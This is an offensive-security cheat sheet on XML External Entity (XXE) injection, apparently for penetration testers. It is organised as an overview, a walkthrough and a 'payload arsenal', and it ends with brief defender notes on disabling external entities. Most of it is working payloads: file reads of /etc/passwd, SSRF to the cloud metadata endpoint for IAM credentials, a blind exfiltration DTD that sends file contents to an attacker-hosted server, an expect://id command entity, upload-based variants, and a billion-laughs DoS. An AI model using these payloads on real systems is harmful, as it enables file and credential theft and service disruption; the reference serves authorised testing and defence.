# XXE — XML External Entity Injection

When a server parses XML you control with a parser that resolves **external entities**, you can
make it read local files, make requests on your behalf (**SSRF**), exfiltrate data out-of-band,
or DoS it. The bug is the parser resolving a `<!ENTITY … SYSTEM "…">` you defined.

Replace placeholders (`<...>`) with your own values: `<your-server>`, `<target>`.

---
---

# PART 1 — OVERVIEW (at a glance)

## The variants

| Variant | When | Result |
|---------|------|--------|
| **In-band file read** | entity value is reflected in the response | read `/etc/passwd`, source, secrets |
| **SSRF** | entity points at a URL | hit internal hosts / cloud metadata |
| **Blind OOB** | no reflection | exfil via an external DTD to your server |
| **Error-based** | parser errors are shown | leak file contents inside the error |
| **Billion laughs** | — | DoS (entity expansion) |

## The workflow

1. **Find** an XML input (POST body, SVG/DOCX/XLSX upload, SOAP, SAML, RSS).
2. **Inject a DOCTYPE** with an external entity; reference it in a reflected field.
3. **Reflected?** in-band file read / SSRF. **Blind?** external-DTD OOB exfil.
4. **Impact** — file read → secrets/creds; SSRF → cloud metadata → cloud account.

## Go-to (in-band file read)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root><name>&x;</name></root>
```

## Defender notes (for the report)

- **Disable DOCTYPE / external entities** in the parser (the real fix) — e.g.
  `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
- Disable external DTDs and parameter entities; prefer a non-XML format (JSON) where possible.

---
---

# PART 2 — DETAILED WALKTHROUGH

## Step 1 — Find XML input

Anywhere the app accepts XML: raw `Content-Type: application/xml` POST bodies, SOAP APIs, file
uploads that parse XML (**SVG**, **DOCX/XLSX/PPTX**, `.xml`), SAML SSO, RSS/Atom imports. In Burp,
if a request body is XML, it's a candidate — reflect a field back first to find your output.

## Step 2 — In-band file read (classic)

Define an external entity and reference it in a field that gets echoed:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&x;</productId></stockCheck>
```

```
what you see: the file contents appear where productId is echoed back
```

If the file breaks XML (has `<`, `&`), read it base64-wrapped via a PHP filter:

```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## Step 3 — SSRF via entity

Point the entity at a URL instead of a file — the server fetches it:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><name>&x;</name></root>
```

Reachable internal hosts and **cloud metadata** (`169.254.169.254`) become readable — see the
**ssrf** sheet for what to hit next.

## Step 4 — Blind OOB (no reflection)

When nothing is echoed, exfiltrate via a **parameter entity** and an **external DTD** you host.

Host `evil.dtd` on `http://<your-server>/`:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<your-server>/?d=%file;'>">
%eval;
%exfil;
```

Then the injected request:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://<your-server>/evil.dtd"> %remote;]>
<root>x</root>
```

```
what you see: your server receives GET /?d=<base64 of /etc/passwd>
```

## Step 5 — Error-based (leak via the parser error)

If the app shows parser errors, force the file content into an error message:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```

The "file not found" error contains the path — i.e. the file's contents.

## Step 6 — XXE via file upload (SVG example)

Uploads that parse XML are XXE too. An SVG that reads a file:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
```

DOCX/XLSX/PPTX are ZIPs of XML — inject into an inner `.xml` and re-zip.

---
---

# PART 3 — PAYLOAD ARSENAL

## Core templates

```xml
<!-- in-band file read -->
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>

<!-- base64 (for files that break XML) -->
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- SSRF / cloud metadata -->
<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- Windows / other schemes -->
<!ENTITY x SYSTEM "file:///c:/windows/win.ini">
<!ENTITY x SYSTEM "expect://id">          <!-- if PHP expect wrapper is loaded -->
```

## Blind OOB — external DTD (host as evil.dtd)

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<your-server>/?d=%file;'>">
%eval;
%exfil;
```

Trigger: `<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://<your-server>/evil.dtd"> %remote;]>`

## Where XML hides

```
application/xml POST bodies · SOAP · SAML (SSO) · RSS/Atom
uploads: .svg · .docx/.xlsx/.pptx (zip of xml) · .xml · .xhtml · .gpx/.kml
```

## Billion laughs (DoS — use with care / authorised only)

```xml
<!DOCTYPE lolz [<!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;">]>
<lolz>&c;</lolz>
```

## Tools

```
Burp Pro scanner flags XXE; or send by hand in Repeater.
Collaborator / interactsh to catch blind OOB callbacks.
```

---

**Key idea:** XXE is the XML parser trusting a `SYSTEM` entity you defined and going to fetch it —
a file (`file://`), an internal URL (`http://` → SSRF), or your server. If the value is reflected
you read files/SSRF directly; if it's blind, an external DTD exfiltrates the data over an OOB
channel. The prize is often local secrets or cloud metadata. Fix: disable DOCTYPE/external
entities in the parser.
